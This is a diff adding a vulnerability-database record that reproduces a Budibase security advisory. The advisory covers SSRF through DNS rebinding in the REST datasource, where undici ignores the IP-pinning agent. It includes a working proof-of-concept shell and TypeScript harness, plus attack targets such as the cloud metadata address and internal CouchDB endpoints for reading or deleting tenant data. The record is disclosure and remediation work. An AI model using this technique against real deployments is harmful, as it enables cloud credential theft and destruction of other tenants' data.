@@ -1,0 +1,171 @@
+[basic]
+description = '''
+### Summary
+Budibase's central outbound-fetch guard (`fetchWithBlacklist`) prevents SSRF/DNS-rebinding by resolving the target hostname, checking every resolved IP against the blacklist, and **pinning** the connection to the validated IP. The pin is implemented as a Node `http(s).Agent` (`makePinnedAgent`). The fix for CVE-2026-54353 relies on this pin to stop DNS rebinding.
+
+The REST datasource integration (`@budibase/server`) calls `fetchWithBlacklist` but performs the actual request with **undici**'s `fetch`. undici does not support the Node `agent` option — it is silently ignored — and instead uses its own `dispatcher`, which re-resolves the hostname's DNS at connection time. As a result, **the validated/pinned IP is never used on the REST datasource path**, and the DNS-rebinding protection that CVE-2026-54353 added is silently defeated for the single most-used outbound path in Budibase.
+
+An authenticated user who can configure/run a REST datasource (e.g. a builder/tenant) can use a rebinding hostname (public IP during validation, internal IP at connect) to make the server issue arbitrary, full-response HTTP requests to internal-only services — cloud metadata (IAM credential theft), the internal CouchDB/Redis/MinIO, and other internal endpoints — reading and, because REST datasources allow arbitrary method/body, writing or destroying internal data.
+
+
+### Details
+**The guard pins the validated IP via a Node agent** — `packages/backend-core/src/utils/outboundFetch.ts`:
+
+- `resolveSafePinnedIp(url)` resolves the hostname and checks every address against `isBlacklisted`, returning a single `pinnedIp` (lines ~39–53).
+- `makePinnedAgent(url, ip)` builds a **Node** `http.Agent`/`https.Agent` whose `lookup` always returns `pinnedIp`, so a node-fetch connection can only reach the validated IP (lines ~55–68).
+- `fetchWithBlacklist` passes that agent into the request: `fetchFn(nextUrl, { ...nextRequest, agent: makePinnedAgent(nextUrl, pinnedIp) })` (lines ~186–192). Each redirect hop is re-validated and re-pinned in the loop.
+
+**The REST integration overrides the transport with undici, which ignores `agent`** — `packages/server/src/integrations/rest.ts`:
+
+- `fetch` is imported from **`undici`** (top-of-file import block, ~line 30).
+- The request is made by overriding `fetchFn` (lines ~767–793):
+  ```ts
+  const setDispatcher = (requestInput, requestUrl) => ({
+    ...requestInput,
+    dispatcher: getDispatcher({ rejectUnauthorized, url: requestUrl }),
+  })
+  ...
+  response = await coreUtils.fetchWithBlacklist(url, input, {
+    fetchFn: async (requestUrl, requestInput) =>
+      fetch(requestUrl, setDispatcher(requestInput, requestUrl)), // undici.fetch
+  })
+  ```
+  The options object reaching `undici.fetch` is `{ ...nextRequest, agent: <pinned Node Agent>, dispatcher: <getDispatcher result> }`. **undici uses `dispatcher` and ignores `agent`.**
+
+**The dispatcher does no IP pinning** — `packages/backend-core/src/utils/fetch.ts`:
+
+- `getDispatcher` → `createDispatcher` → (no proxy env) → `createDirectAgent` = `new Agent({ connect: { rejectUnauthorized } })` (lines ~109–114, ~161–172, ~183). This is a plain undici `Agent` with **no `connect.lookup` / no pin**, so undici resolves the hostname's DNS itself at connect time.
+
+**Net effect (TOCTOU / DNS rebinding):** `fetchWithBlacklist` validates the hostname → safe public IP and builds a pinned Node agent; the REST path then connects via undici, which re-resolves the same hostname independently. With a rebinding domain (TTL 0: public IP during validation, `127.0.0.1` / `169.254.169.254` / internal IP at connect), the request lands on an internal service — exactly the gap CVE-2026-54353's pin was meant to close.
+
+**Scope of impact / why it's REST-specific:** `rest.ts` is the only caller that overrides `fetchFn` with undici. All other outbound sinks (automation `outgoingWebhook`/`n8n`/`make`/`zapier`/`discord`/`slack`, and AI-extract's `processUrlFile`) use the default node-fetch-based `fetchWithBlacklist`, which **does** honor the pinned agent and is **not** affected. REST datasource queries are the most common outbound path, and the response body is returned to the caller (full-response SSRF, not blind).
+
+### PoC
+The PoC drives the **real, unmodified** guard code (`outboundFetch.ts` + `fetch.ts`, copied verbatim — sha256 verified) and reproduces the exact `rest.ts` call pattern. Only the `../blacklist` module is stubbed to model the rebinding **input** (validation observes a safe public IP). Requires Node 18+.
+
+```bash
+# prerequisite: a Budibase checkout; set BB to its path
+export BB=/path/to/budibase
+mkdir ssrf-poc && cd ssrf-poc
+SRC=\"$BB/packages/backend-core/src\"
+
+# 1) Copy the REAL guard code, verbatim (sha proves no edits)
+mkdir -p real/utils real/blacklist
+cp \"$SRC/utils/outboundFetch.ts\" real/utils/
+cp \"$SRC/utils/fetch.ts\"         real/utils/
+
+# 2) Scenario stub = the rebinding INPUT: validation sees a safe, non-blacklisted public IP
+cat > real/blacklist/index.ts <<'EOF'
+const SAFE = \"203.0.113.10\" // RFC5737 TEST-NET-3, not blacklisted -> validation passes
+export async function resolveAddress(_a: string): Promise<string[]> { return [SAFE] }
+export async function isBlacklisted(a: string): Promise<boolean> { return a !== SAFE }
+EOF
+
+# 3) Harness = REAL fetchWithBlacklist + REAL getDispatcher, exact rest.ts pattern
+cat > entry.ts <<'EOF'
+import http from \"http\"
+import { fetch as undiciFetch } from \"undici\"
+import { fetchWithBlacklist } from \"./real/utils/outboundFetch\" // REAL guard
+import { getDispatcher } from \"./real/utils/fetch\"              // REAL dispatcher
+async function main() {
+  const server = http.createServer((_q, r) => r.end(\"INTERNAL_SECRET_RESPONSE\"))
+  await new Promise<void>(r => server.listen(0, \"127.0.0.1\", r))
+  const port = (server.address() as any).port
+  const target = `http://localhost:${port}/` // OS resolves localhost -> 127.0.0.1 at connect
+  console.log(`[*] internal service 127.0.0.1:${port}; guard validates host -> 203.0.113.10 (safe), pins to it`)
+
+  // (A) REST datasource path: undici fetch + real getDispatcher (exactly rest.ts).
+  const restFetchFn = (u: string, i: any) =>
+    undiciFetch(u, { ...i, dispatcher: getDispatcher({ url: u, rejectUnauthorized: true }) as any }) as any
+  let A: string
+  try { const r: any = await fetchWithBlacklist(target, { method: \"GET\" } as any, { fetchFn: restFetchFn }); A = `status ${r.status} body=${await r.text()}` }
+  catch (e: any) { A = `ERROR ${e.message}` }
+  console.log(\"(A) REST/undici path  ->\", A)
+
+  // (B) Negative control: default fetchFn (node-fetch) honors the pinned agent.
+  let B: string
+  try { const r: any = await fetchWithBlacklist(target, { method: \"GET\", timeout: 3000 } as any); B = `status ${r.status} body=${await r.text()}` }
+  catch (e: any) { B = `ERROR ${e.message}` }
+  console.log(\"(B) node-fetch path   ->\", B)
+
+  const bypass = A.includes(\"INTERNAL_SECRET_RESPONSE\"), contained = !B.includes(\"INTERNAL_SECRET_RESPONSE\")
+  console.log(`\nRESULT: ${bypass && contained ? \"PASS - undici path BYPASSES guard, node-fetch path CONTAINED\" : \"FAIL\"}`)
+  server.close(); process.exit(bypass && contained ? 0 : 1)
+}
+main()
+EOF
+
+# 4) Deps, bundle, run
+npm init -y >/dev/null 2>&1
+npm install undici@6 node-fetch@2 esbuild
+npx esbuild entry.ts --bundle --platform=node --format=cjs --outfile=entry.cjs
+node entry.cjs
+```
+
+**Expected output** (the port is the only variable):
+
+```
+[*] internal service 127.0.0.1:<random>; guard validates host -> 203.0.113.10 (safe), pins to it
+(A) REST/undici path  -> status 200 body=INTERNAL_SECRET_RESPONSE
+(B) node-fetch path   -> ERROR Failed to connect to resolved IP for localhost: network timeout at: http://localhost:<random>/
+
+RESULT: PASS - undici path BYPASSES guard, node-fetch path CONTAINED
+```
+
+**How to read it:**
+- **(A)** the real `fetchWithBlacklist` validated and pinned the safe public IP `203.0.113.10`, yet the undici REST transport re-resolved `localhost` and reached `127.0.0.1` — the internal service responded → **SSRF bypass**.
+- **(B)** the default node-fetch path honored the pin (forced to the unroutable `203.0.113.10`) and never reached the internal service. The `\"Failed to connect to resolved IP for localhost\"` string is emitted by the real `outboundFetch.ts`, proving the pin works there. This is the negative control localizing the bug to the undici transport.
+
+**Real-world variant:** instead of `localhost`, an attacker uses a domain they control with a 0-second TTL that returns a public IP during the guard's validation lookup and an internal IP (`169.254.169.254`, `127.0.0.1`, internal CouchDB/Redis) at undici's connect-time lookup; the REST datasource query then returns the internal response body to the attacker.
+
+### Impact
+**Type:** Server-Side Request Forgery via DNS rebinding (CWE-918 + CWE-367), full-response and with arbitrary HTTP method/body (REST datasources let the caller choose method, headers, and body).
+
+**Who is impacted:** Any Budibase deployment on an affected version, especially multi-tenant / Budibase-Cloud-style hosting where builders/tenants are not trusted with host-internal access. The SSRF blacklist is the control that contains those users; this bypass defeats it.
+
+**Realistic worst case:** An authenticated builder/tenant points a REST datasource at a rebinding host and makes the server:
+- read cloud metadata (`http://169.254.169.254/...`) → steal IAM credentials → **cloud account compromise**;
+- read the internal CouchDB (`http://127.0.0.1:5984/_all_dbs`, `_users`) → **all tenants' apps, users, and secrets**;
+- using `PUT`/`POST`/`DELETE` against unauthenticated localhost services → create admin documents, modify or **delete** tenant databases / flush caches → integrity and availability loss for all co-tenants.
+
+### CVSS 3.1 Vector Justification
+
+| Metric | Value | Why |
+|---|---|---|
+| Attack Vector (AV) | Network (N) | Triggered through Budibase's HTTP API / app (a REST datasource query). |
+| Attack Complexity (AC) | High (H) | Requires DNS rebinding — the validation-time IP must differ from the connect-time IP (TOCTOU). A direct internal request without rebinding is blocked by the blacklist, so the race is mandatory. |
+| Privileges Required (PR) | Low (L) | Requires an authenticated account that can configure/run a REST datasource (builder/tenant). |
+| User Interaction (UI) | None (N) | The attacker configures and triggers the request; no victim interaction. |
+| Scope (S) | Changed (C) | Canonical SSRF: the vulnerable component is abused to reach resources in other security authorities (cloud metadata, internal CouchDB/Redis/MinIO). |
+| Confidentiality (C) | High (H) | Full-response SSRF: read cloud IAM credentials and the internal CouchDB (every tenant's apps, users, secrets). |
+| Integrity (I) | High (H) | Arbitrary method/body allows `PUT`/`POST`/`DELETE` to unauthenticated localhost services (CouchDB `:5984`) → create admin docs, modify tenant data. |
+| Availability (A) | High (H) | The same write primitive can `DELETE` databases / flush Redis → full data/service loss for all tenants. |
+
+**Notes:** AC:H is the standard, defensible scoring for DNS rebinding; if rebinding is treated as reliable (TTL-0 frameworks), `AC:L` yields `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`. A conservative read-only interpretation  is `I:N/A:N`.
+
+### Suggested remediation
+
+Make the transport that actually performs the request honor the validated IP. In `getDispatcher`/`rest.ts`, construct the undici `Agent` with a `connect: { lookup }` (or custom `connect`) that returns **only** the `pinnedIp` resolved by `fetchWithBlacklist` (i.e., mirror `makePinnedAgent` for undici), so the dispatcher cannot re-resolve DNS; alternatively, re-check the resolved peer IP against `isBlacklisted` inside the undici `connect` callback. The Node-`agent` pin must not be relied upon when the request is issued through undici.
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Budibase: SSRF via DNS rebinding in the REST datasource integration"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-v42f-v8xc-j435"]
+ave_id = "AVE-2026-1210"
+
+[meta]
+collected_at = "2026-08-06T13:15:45.776086104+00:00"
+status = "completed"
+
+[references]
+urls = []
